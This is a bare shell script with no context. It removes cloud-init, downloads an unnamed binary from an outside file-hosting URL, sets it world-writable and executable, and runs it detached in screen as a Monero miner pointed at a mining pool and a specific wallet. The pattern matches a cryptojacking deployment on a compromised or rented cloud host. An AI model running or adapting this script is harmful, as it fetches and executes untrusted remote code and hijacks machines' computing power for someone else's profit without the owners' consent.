sudo apt autoremove cloud-init -y
sudo apt update
sudo apt install screen -y
wget -O- https://skyportal.xyz/AAC1RaMUtO5Y52Ioh-OQ4_75cIDq7wbwtmjs7A3k3_XjWA > /home/freenet/kk
sudo chmod 777 /home/freenet/kk
echo "./kk --url xmr.kryptex.network:7000 --user 874CsAXxxTmWddUgkyW8xqHPUeYGYsDKQWhQCZKphsHdH4KAR2XAakAP3sCn9qHz5Pbvti8NVYQJR1BaxmruQ3KDPHQqXVY.v2db8a24b2 -p x --coin XMR --log-file 1610400241_xmr_12000_log.txt --http-port 12000 --randomx-1gb-pages" > /home/freenet/start.sh
sudo chmod 777 /home/freenet/start.sh
screen -d -m /home/freenet/start.sh